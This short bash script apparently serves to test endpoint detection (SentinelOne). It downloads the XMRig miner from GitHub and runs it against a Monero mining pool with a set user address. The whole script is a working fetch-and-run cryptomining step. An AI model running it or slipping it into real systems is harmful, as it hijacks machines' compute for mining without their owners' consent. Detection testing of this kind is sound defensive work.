#!/bin/bash

#NOTE: XMRig binary will be detected by SentinelOne Cloud
#NOTE: It will also be detected by Behavioral AI (if not mitigated by S1 Cloud detection)
curl -sLO https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz
tar -xvf xmrig-6.19.2-linux-x64.tar.gz
cd xmrig-6.19.2
./xmrig "--cpu-max-threads-hint=10" "-o" "xmr.pool.minergate.com:45700" "-u" "cash4@johnny-ataquero.io" "-p" "x" "-k"